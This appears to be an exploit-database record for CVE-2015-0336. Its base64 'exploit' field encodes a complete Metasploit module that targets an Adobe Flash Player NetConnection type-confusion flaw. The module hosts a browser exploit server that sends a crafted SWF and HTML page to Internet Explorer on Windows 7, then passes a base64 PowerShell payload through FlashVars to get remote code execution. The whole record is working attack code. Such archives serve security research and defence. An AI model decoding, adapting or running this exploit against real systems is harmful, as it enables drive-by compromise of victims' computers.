{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gTm9ybWFsUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpQb3dlcnNoZWxsDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJFeHBsb2l0U2VydmVyDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICAgICAgID0+ICdBZG9iZSBGbGFzaCBQbGF5ZXIgTmV0Q29ubmVjdGlvbiBUeXBlIENvbmZ1c2lvbicsDQogICAgICAnRGVzY3JpcHRpb24nICAgICAgICAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgdHlwZSBjb25mdXNpb24gdnVsbmVyYWJpbGl0eSBpbiB0aGUgTmV0Q29ubmVjdGlvbiBjbGFzcyBvbg0KICAgICAgICBBZG9iZSBGbGFzaCBQbGF5ZXIuIFdoZW4gdXNpbmcgYSBjb3JyZWN0IG1lbW9yeSBsYXlvdXQgdGhpcyB2dWxuZXJhYmlsaXR5IGFsbG93cw0KICAgICAgICB0byBjb3JydXB0IGFyYml0cmFyeSBtZW1vcnkuIEl0IGNhbiBiZSB1c2VkIHRvIG92ZXJ3cml0ZSBkYW5nZXJvdXMgb2JqZWN0cywgbGlrZQ0KICAgICAgICB2ZWN0b3JzLCBhbmQgZmluYWxseSBhY2NvbXBsaXNoIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbi4gVGhpcyBtb2R1bGUgaGFzIGJlZW4gdGVzdGVkDQogICAgICAgIHN1Y2Nlc3NmdWxseSBvbiBXaW5kb3dzIDcgU1AxICgzMi1iaXQpLCBJRSA4IGFuZCBJRTExIHdpdGggRmxhc2ggMTYuMC4wLjMwNS4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgICAgICAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgICAgICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdOYXRhbGllIFNpbHZhbm92aWNoJywgIyBWdWxuZXJhYmlsaXR5IGRpc2NvdmVyeSBhbmQgR29vZ2xlIFByb2plY3QgWmVybyBFeHBsb2l0DQogICAgICAgICAgJ1Vua25vd24nLCAjIEV4cGxvaXQgaW4gdGhlIHdpbGQNCiAgICAgICAgICAnanVhbiB2YXpxdWV6JyAjIG1zZiBtb2R1bGUNCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgICAgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNS0wMzM2J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vc2VjdXJpdHkvcHJvZHVjdHMvZmxhc2gtcGxheWVyL2Fwc2IxNS0wNS5odG1sJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL2dvb2dsZXByb2plY3R6ZXJvLmJsb2dzcG90LmNvbS8yMDE1LzA0L2EtdGFsZS1vZi10d28tZXhwbG9pdHMuaHRtbCddLA0KICAgICAgICAgIFsnVVJMJywgJ2h0dHA6Ly9tYWx3YXJlLmRvbnRuZWVkY29mZmVlLmNvbS8yMDE1LzAzL2N2ZS0yMDE1LTAzMzYtZmxhc2gtdXAtdG8tMTYwMDMwNS1hbmQuaHRtbCddLA0KICAgICAgICAgIFsnVVJMJywgJ2h0dHBzOi8vd3d3LmZpcmVleWUuY29tL2Jsb2cvdGhyZWF0LXJlc2VhcmNoLzIwMTUvMDMvY3ZlLTIwMTUtMDMzNl9udWNsZWEuaHRtbCddLA0KICAgICAgICAgIFsnVVJMJywgJ2h0dHBzOi8vYmxvZy5tYWx3YXJlYnl0ZXMub3JnL2V4cGxvaXRzLTIvMjAxNS8wMy9udWNsZWFyLWVrLWxldmVyYWdlcy1yZWNlbnRseS1wYXRjaGVkLWZsYXNoLXZ1bG5lcmFiaWxpdHkvJ10NCiAgICAgICAgXSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgICAgICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0Rpc2FibGVOb3BzJyA9PiB0cnVlDQogICAgICAgIH0sDQogICAgICAnUGxhdGZvcm0nICAgICAgICAgICAgPT4gJ3dpbicsDQogICAgICAnQnJvd3NlclJlcXVpcmVtZW50cycgPT4NCiAgICAgICAgew0KICAgICAgICAgIDpzb3VyY2UgID0+IC9zY3JpcHR8aGVhZGVycy9pLA0KICAgICAgICAgIDpvc19uYW1lID0+IE9wZXJhdGluZ1N5c3RlbXM6Ok1hdGNoOjpXSU5ET1dTXzcsDQogICAgICAgICAgOnVhX25hbWUgPT4gTXNmOjpIdHRwQ2xpZW50czo6SUUsDQogICAgICAgICAgOmZsYXNoICAgPT4gbGFtYmRhIHsgfHZlcnwgdmVyID1+IC9eMTZcLi8gJiYgR2VtOjpWZXJzaW9uLm5ldyh2ZXIpIDw9IEdlbTo6VmVyc2lvbi5uZXcoJzE2LjAuMC4zMDUnKSB9LA0KICAgICAgICAgIDphcmNoICAgID0+IEFSQ0hfWDg2DQogICAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0F1dG9tYXRpYycsIHt9IF0NCiAgICAgICAgXSwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgICAgICA9PiBmYWxzZSwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgICAgICA9PiAnTWFyIDEyIDIwMTUnLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICAgICAgID0+IDApKQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIEBzd2YgPSBjcmVhdGVfc3dmDQogICAgQHRyaWdnZXIgPSBjcmVhdGVfdHJpZ2dlcg0KICAgIHN1cGVyDQogIGVuZA0KDQogIGRlZiBvbl9yZXF1ZXN0X2V4cGxvaXQoY2xpLCByZXF1ZXN0LCB0YXJnZXRfaW5mbykNCiAgICBwcmludF9zdGF0dXMoIlJlcXVlc3Q6ICN7cmVxdWVzdC51cml9IikNCg0KICAgIGlmIHJlcXVlc3QudXJpID1+IC9cLnN3ZiQvDQogICAgICBwcmludF9zdGF0dXMoJ1NlbmRpbmcgU1dGLi4uJykNCiAgICAgIHNlbmRfcmVzcG9uc2UoY2xpLCBAc3dmLCB7J0NvbnRlbnQtVHlwZSc9PidhcHBsaWNhdGlvbi94LXNob2Nrd2F2ZS1mbGFzaCcsICdDYWNoZS1Db250cm9sJyA9PiAnbm8tY2FjaGUsIG5vLXN0b3JlJywgJ1ByYWdtYScgPT4gJ25vLWNhY2hlJ30pDQogICAgICByZXR1cm4NCiAgICBlbmQNCg0KICAgIHByaW50X3N0YXR1cygnU2VuZGluZyBIVE1MLi4uJykNCiAgICBzZW5kX2V4cGxvaXRfaHRtbChjbGksIGV4cGxvaXRfdGVtcGxhdGUoY2xpLCB0YXJnZXRfaW5mbyksIHsnUHJhZ21hJyA9PiAnbm8tY2FjaGUnfSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXRfdGVtcGxhdGUoY2xpLCB0YXJnZXRfaW5mbykNCiAgICBzd2ZfcmFuZG9tID0gIiN7cmFuZF90ZXh0X2FscGhhKDQgKyByYW5kKDMpKX0uc3dmIg0KICAgIHRhcmdldF9wYXlsb2FkID0gZ2V0X3BheWxvYWQoY2xpLCB0YXJnZXRfaW5mbykNCiAgICBwc2hfcGF5bG9hZCA9IGNtZF9wc2hfcGF5bG9hZCh0YXJnZXRfcGF5bG9hZCwgJ3g4NicsIHtyZW1vdmVfY29tc3BlYzogdHJ1ZX0pDQogICAgYjY0X3BheWxvYWQgPSBSZXg6OlRleHQuZW5jb2RlX2Jhc2U2NChwc2hfcGF5bG9hZCkNCg0KICAgIHRyaWdnZXJfaGV4X3N0cmVhbSA9IEB0cmlnZ2VyLnVucGFjaygnSConKVswXQ0KDQogICAgaHRtbF90ZW1wbGF0ZSA9ICVRfDxodG1sPg0KICAgIDxib2R5Pg0KICAgIDxvYmplY3QgY2xhc3NpZD0iY2xzaWQ6ZDI3Y2RiNmUtYWU2ZC0xMWNmLTk2YjgtNDQ0NTUzNTQwMDAwIiBjb2RlYmFzZT0iaHR0cDovL2Rvd25sb2FkLm1hY3JvbWVkaWEuY29tL3B1Yi9zaG9ja3dhdmUvY2Ficy9mbGFzaC9zd2ZsYXNoLmNhYiIgd2lkdGg9IjEiIGhlaWdodD0iMSIgLz4NCiAgICA8cGFyYW0gbmFtZT0ibW92aWUiIHZhbHVlPSI8JT1zd2ZfcmFuZG9tJT4iIC8+DQogICAgPHBhcmFtIG5hbWU9ImFsbG93U2NyaXB0QWNjZXNzIiB2YWx1ZT0iYWx3YXlzIiAvPg0KICAgIDxwYXJhbSBuYW1lPSJGbGFzaFZhcnMiIHZhbHVlPSJzaD08JT1iNjRfcGF5bG9hZCU+JnRyPTwlPXRyaWdnZXJfaGV4X3N0cmVhbSU+IiAvPg0KICAgIDxwYXJhbSBuYW1lPSJQbGF5IiB2YWx1ZT0idHJ1ZSIgLz4NCiAgICA8ZW1iZWQgdHlwZT0iYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2giIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHNyYz0iPCU9c3dmX3JhbmRvbSU+IiBhbGxvd1NjcmlwdEFjY2Vzcz0iYWx3YXlzIiBGbGFzaFZhcnM9InNoPTwlPWI2NF9wYXlsb2FkJT4mdHI9PCU9dHJpZ2dlcl9oZXhfc3RyZWFtJT4iIFBsYXk9InRydWUiLz4NCiAgICA8L29iamVjdD4NCiAgICA8L2JvZHk+DQogICAgPC9odG1sPg0KICAgIHwNCg0KICAgIHJldHVybiBodG1sX3RlbXBsYXRlLCBiaW5kaW5nKCkNCiAgZW5kDQoNCiAgZGVmIGNyZWF0ZV9zd2YNCiAgICBwYXRoID0gOjpGaWxlLmpvaW4oTXNmOjpDb25maWcuZGF0YV9kaXJlY3RvcnksICdleHBsb2l0cycsICdDVkUtMjAxNS0wMzM2JywgJ21zZi5zd2YnKQ0KICAgIHN3ZiA9ICA6OkZpbGUub3BlbihwYXRoLCAncmInKSB7IHxmfCBzd2YgPSBmLnJlYWQgfQ0KDQogICAgc3dmDQogIGVuZA0KDQogIGRlZiBjcmVhdGVfdHJpZ2dlcg0KICAgIHBhdGggPSA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgJ2V4cGxvaXRzJywgJ0NWRS0yMDE1LTAzMzYnLCAndHJpZ2dlci5zd2YnKQ0KICAgIHN3ZiA9ICA6OkZpbGUub3BlbihwYXRoLCAncmInKSB7IHxmfCBzd2YgPSBmLnJlYWQgfQ0KDQogICAgc3dmDQogIGVuZA0KZW5k", 
    "filename": "platforms/windows/remote/36962.rb", 
    "id": "36962", 
    "cves": [
        "CVE-2015-0336"
    ]
}